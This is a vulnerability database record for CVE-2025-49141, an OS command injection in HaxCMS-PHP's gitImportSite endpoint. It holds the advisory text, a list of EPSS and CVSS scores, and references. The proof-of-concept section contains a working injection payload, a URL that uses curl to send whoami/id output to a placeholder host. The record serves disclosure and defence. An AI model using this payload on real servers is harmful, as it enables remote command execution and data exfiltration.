vulnerability_id: VCID-bdnk-mxpm-8yfc
aliases:
  - CVE-2025-49141
  - GHSA-g4cf-pp4x-hqgw
summary: |
  HaxCMS-PHP Command Injection Vulnerability
  ### Summary
  The 'gitImportSite' functionality obtains a URL string from a POST request and insufficiently validates user input. The ’set_remote’ function later passes this input into ’proc_open’, yielding OS command injection.

  ### Details
  The vulnerability exists in the logic of the ’gitImportSite’ function, located in ’Operations.php’. The current implementation only relies on the ’filter_var’ and 'strpos' functions to validate the URL, which is not sufficient to ensure absence of all Bash special characters used for command injection.
  ![gitImportSite](https://github.com/user-attachments/assets/af9935ef-4735-446d-833f-2c2590ff1508)

  #### Affected Resources
  • Operations.php:2103 gitImportSite()
  • \<domain\>/\<user\>/system/api/gitImportSite



  ### PoC
  To replicate this vulnerability, authenticate and send a POST request to the 'gitImportSite' endpoint with a crafted URL in the JSON data. Note, a valid token needs to be obtained by capturing a request to another API endpoint (such as 'archiveSite').

  1. Start a webserver.
  ![webserver](https://github.com/user-attachments/assets/8594f9b1-67fa-4352-bbc3-310bb164ec9b)

  2. Initiate a request to the ’archiveSite’ endpoint.
  ![archiveSite](https://github.com/user-attachments/assets/08503f36-d984-4d53-8fe6-577ad78d5eb7)

  3.  Capture and modify the request in BurpSuite.
  ![request-modification](https://github.com/user-attachments/assets/61cd211e-afd3-453e-b86b-58bccffaf824)






  4. Observe command output in the HTTP request from the server.
  ![command-output](https://github.com/user-attachments/assets/35f32274-b709-41d5-adaa-bea48f5cf33c)


  #### Command Injection Payload
  ```Bash
  http://<IP>/.git;curl${IFS}<IP>/$(whoami)/$(id)#=abcdef
  ```


  ### Impact
  An authenticated attacker can craft a URL string that bypasses the validation checks employed by the ’filter_var’ and ’strpos’ functions in order to execute arbitrary OS commands on the backend server. The attacker can exfiltrate command output via an HTTP request.
severities:
  - score: '0.00215'
    scoring_system: epss
    scoring_elements: '0.44289'
    published_at: '2025-06-10 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00215'
    scoring_system: epss
    scoring_elements: '0.44355'
    published_at: '2025-06-12 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00287'
    scoring_system: epss
    scoring_elements: '0.51879'
    published_at: '2025-06-15 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00287'
    scoring_system: epss
    scoring_elements: '0.51804'
    published_at: '2025-06-19 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00287'
    scoring_system: epss
    scoring_elements: '0.51869'
    published_at: '2025-06-17 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00499'
    scoring_system: epss
    scoring_elements: '0.64891'
    published_at: '2025-07-22 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00499'
    scoring_system: epss
    scoring_elements: '0.64886'
    published_at: '2025-07-21 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00499'
    scoring_system: epss
    scoring_elements: '0.6496'
    published_at: '2025-07-18 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00499'
    scoring_system: epss
    scoring_elements: '0.64955'
    published_at: '2025-07-17 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00499'
    scoring_system: epss
    scoring_elements: '0.64966'
    published_at: '2025-07-16 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00499'
    scoring_system: epss
    scoring_elements: '0.64941'
    published_at: '2025-07-14 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00499'
    scoring_system: epss
    scoring_elements: '0.64957'
    published_at: '2025-07-12 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00499'
    scoring_system: epss
    scoring_elements: '0.64873'
    published_at: '2025-08-14 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00499'
    scoring_system: epss
    scoring_elements: '0.64885'
    published_at: '2025-08-15 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00499'
    scoring_system: epss
    scoring_elements: '0.64853'
    published_at: '2025-08-13 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00499'
    scoring_system: epss
    scoring_elements: '0.64833'
    published_at: '2025-08-12 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00536'
    scoring_system: epss
    scoring_elements: '0.66554'
    published_at: '2025-07-09 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00536'
    scoring_system: epss
    scoring_elements: '0.66463'
    published_at: '2025-06-22 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00536'
    scoring_system: epss
    scoring_elements: '0.66452'
    published_at: '2025-06-25 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00536'
    scoring_system: epss
    scoring_elements: '0.66478'
    published_at: '2025-06-27 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00536'
    scoring_system: epss
    scoring_elements: '0.66665'
    published_at: '2025-07-03 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00536'
    scoring_system: epss
    scoring_elements: '0.6656'
    published_at: '2025-07-10 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00576'
    scoring_system: epss
    scoring_elements: '0.67801'
    published_at: '2025-10-07 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00576'
    scoring_system: epss
    scoring_elements: '0.67763'
    published_at: '2025-10-08 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00576'
    scoring_system: epss
    scoring_elements: '0.67794'
    published_at: '2025-08-22 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00576'
    scoring_system: epss
    scoring_elements: '0.67793'
    published_at: '2025-08-23 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00576'
    scoring_system: epss
    scoring_elements: '0.67816'
    published_at: '2025-09-08 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00576'
    scoring_system: epss
    scoring_elements: '0.67775'
    published_at: '2025-08-24 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00576'
    scoring_system: epss
    scoring_elements: '0.67855'
    published_at: '2025-09-19 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00576'
    scoring_system: epss
    scoring_elements: '0.67828'
    published_at: '2025-09-22 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00576'
    scoring_system: epss
    scoring_elements: '0.67867'
    published_at: '2025-09-23 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00576'
    scoring_system: epss
    scoring_elements: '0.67876'
    published_at: '2025-09-27 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00576'
    scoring_system: epss
    scoring_elements: '0.67863'
    published_at: '2025-09-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00576'
    scoring_system: epss
    scoring_elements: '0.6786'
    published_at: '2025-09-29 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00576'
    scoring_system: epss
    scoring_elements: '0.67951'
    published_at: '2025-10-03 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00576'
    scoring_system: epss
    scoring_elements: '0.67945'
    published_at: '2025-10-02 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00576'
    scoring_system: epss
    scoring_elements: '0.67797'
    published_at: '2025-10-06 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00576'
    scoring_system: epss
    scoring_elements: '0.67847'
    published_at: '2025-09-17 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00576'
    scoring_system: epss
    scoring_elements: '0.67862'
    published_at: '2025-09-24 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00576'
    scoring_system: epss
    scoring_elements: '0.67851'
    published_at: '2025-09-13 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00576'
    scoring_system: epss
    scoring_elements: '0.67844'
    published_at: '2025-09-10 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00576'
    scoring_system: epss
    scoring_elements: '0.67811'
    published_at: '2025-09-09 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00635'
    scoring_system: epss
    scoring_elements: '0.69826'
    published_at: '2026-01-11 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00659'
    scoring_system: epss
    scoring_elements: '0.70267'
    published_at: '2025-10-24 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00659'
    scoring_system: epss
    scoring_elements: '0.70269'
    published_at: '2025-10-25 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00659'
    scoring_system: epss
    scoring_elements: '0.7019'
    published_at: '2025-10-13 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00659'
    scoring_system: epss
    scoring_elements: '0.7022'
    published_at: '2025-10-15 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00659'
    scoring_system: epss
    scoring_elements: '0.70224'
    published_at: '2025-10-16 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00659'
    scoring_system: epss
    scoring_elements: '0.70228'
    published_at: '2025-10-17 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00659'
    scoring_system: epss
    scoring_elements: '0.70223'
    published_at: '2025-10-18 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00659'
    scoring_system: epss
    scoring_elements: '0.70217'
    published_at: '2025-10-19 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00659'
    scoring_system: epss
    scoring_elements: '0.70206'
    published_at: '2025-10-20 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00659'
    scoring_system: epss
    scoring_elements: '0.70263'
    published_at: '2025-10-23 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00659'
    scoring_system: epss
    scoring_elements: '0.70422'
    published_at: '2025-11-03 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00659'
    scoring_system: epss
    scoring_elements: '0.70426'
    published_at: '2025-11-02 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00659'
    scoring_system: epss
    scoring_elements: '0.70305'
    published_at: '2025-10-30 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00659'
    scoring_system: epss
    scoring_elements: '0.70297'
    published_at: '2025-10-29 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: '0.00659'
    scoring_system: epss
    scoring_elements: '0.70292'
    published_at: '2025-10-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-g4cf-pp4x-hqgw
  - score: '8.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H
    published_at: None
    url: https://github.com/haxtheweb/haxcms-nodejs
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/haxtheweb/haxcms-nodejs
  - score: '8.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H
    published_at: None
    url: https://github.com/haxtheweb/haxcms-nodejs/commit/5131fea6b6be611db76a618f89bd2e164752e9b3
  - score: '8.6'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H
    published_at: None
    url: https://github.com/haxtheweb/haxcms-nodejs/commit/5131fea6b6be611db76a618f89bd2e164752e9b3
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/haxtheweb/haxcms-nodejs/commit/5131fea6b6be611db76a618f89bd2e164752e9b3
  - score: Track*
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:P/A:N/T:T/P:M/B:A/M:M/D:R/2025-06-10T15:09:25Z/
    published_at: None
    url: https://github.com/haxtheweb/haxcms-nodejs/commit/5131fea6b6be611db76a618f89bd2e164752e9b3
  - score: '8.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H
    published_at: None
    url: https://github.com/haxtheweb/issues
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/haxtheweb/issues
  - score: '8.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H
    published_at: None
    url: https://github.com/haxtheweb/issues/security/advisories/GHSA-g4cf-pp4x-hqgw
  - score: '8.6'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H
    published_at: None
    url: https://github.com/haxtheweb/issues/security/advisories/GHSA-g4cf-pp4x-hqgw
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/haxtheweb/issues/security/advisories/GHSA-g4cf-pp4x-hqgw
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/haxtheweb/issues/security/advisories/GHSA-g4cf-pp4x-hqgw
  - score: Track*
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:P/A:N/T:T/P:M/B:A/M:M/D:R/2025-06-10T15:09:25Z/
    published_at: None
    url: https://github.com/haxtheweb/issues/security/advisories/GHSA-g4cf-pp4x-hqgw
  - score: '8.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2025-49141
  - score: '8.8'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2025-49141
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2025-49141
weaknesses:
  - CWE-78
  - CWE-1035
  - CWE-937
references:
  - url: https://api.first.org/data/v1/epss?cve=CVE-2025-49141
    reference_type:
    reference_id:
  - url: https://github.com/haxtheweb/haxcms-nodejs
    reference_type:
    reference_id:
  - url: https://github.com/haxtheweb/haxcms-nodejs/commit/5131fea6b6be611db76a618f89bd2e164752e9b3
    reference_type:
    reference_id:
  - url: https://github.com/haxtheweb/issues
    reference_type:
    reference_id:
  - url: https://github.com/haxtheweb/issues/security/advisories/GHSA-g4cf-pp4x-hqgw
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-49141
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/search/results?adv_search=true&isCpeNameSearch=true&query=cpe:2.3:a:haxtheweb:haxcms-nodejs:*:*:*:*:*:node.js:*:*
    reference_type:
    reference_id: cpe:2.3:a:haxtheweb:haxcms-nodejs:*:*:*:*:*:node.js:*:*
  - url: https://nvd.nist.gov/vuln/search/results?adv_search=true&isCpeNameSearch=true&query=cpe:2.3:a:haxtheweb:haxcms-php:*:*:*:*:*:*:*:*
    reference_type:
    reference_id: cpe:2.3:a:haxtheweb:haxcms-php:*:*:*:*:*:*:*:*
  - url: https://nvd.nist.gov/vuln/search/results?adv_search=true&isCpeNameSearch=true&query=cpe:2.3:a:psu:haxcms-nodejs:*:*:*:*:*:node.js:*:*
    reference_type:
    reference_id: cpe:2.3:a:psu:haxcms-nodejs:*:*:*:*:*:node.js:*:*
  - url: https://nvd.nist.gov/vuln/search/results?adv_search=true&isCpeNameSearch=true&query=cpe:2.3:a:psu:haxcms-php:*:*:*:*:*:*:*:*
    reference_type:
    reference_id: cpe:2.3:a:psu:haxcms-php:*:*:*:*:*:*:*:*
  - url: https://github.com/advisories/GHSA-g4cf-pp4x-hqgw
    reference_type:
    reference_id: GHSA-g4cf-pp4x-hqgw
